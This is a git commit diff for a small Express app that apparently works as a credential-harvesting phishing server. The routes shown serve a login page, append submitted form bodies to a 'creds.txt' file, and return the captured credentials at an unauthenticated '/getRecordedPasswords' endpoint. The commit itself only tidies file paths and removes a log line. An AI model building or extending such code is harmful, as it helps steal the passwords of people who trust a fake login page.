ae593cb5a32292adb8df57e3513fb0540bfeaf1e
Your Name <you@example.com>
2024-02-14 17:47:42 +0300

    dev

--- app.js
+++ app.js
@@ -6,11 +6,11 @@ const app = express();
 
 
 app.use(express.json());
-app.use(express.static(`${__dirname}\\static_files`));
+app.use(express.static(`${__dirname}/static_files`));
 
 
 app.get('/login' , (req , res , next) => {
-    const filePath = `./static_files/login.html`;
+    const filePath = './static_files/login.html';
     fs.readFile(filePath , (err , data) => {
         res.send(data.toString());
     })
@@ -18,7 +18,7 @@ app.get('/login' , (req , res , next) => {
 
 
 app.get('/getRecordedPasswords' , (req , res , next) => {
-    const filePath = `./database/creds.txt`;
+    const filePath = './database/creds.txt';
     fs.readFile(filePath, (err , data) => {
         res.send(data.toString());
     });
--- controllers/saveCreds.js
+++ controllers/saveCreds.js
@@ -3,8 +3,7 @@ const fs = require('fs');
 
 exports.saveCreds = async (req , res , next) => {
     const newCreds = JSON.stringify(req.body) + "\n";
-    console.log(newCreds);
-    fs.appendFile(`${__dirname}\\..\\database\\creds.txt` , newCreds  , (err) => {
+    fs.appendFile('./database/creds.txt' , newCreds  , (err) => {
         if (err){
             console.log(`Error writing to file: ${err}`);
         }
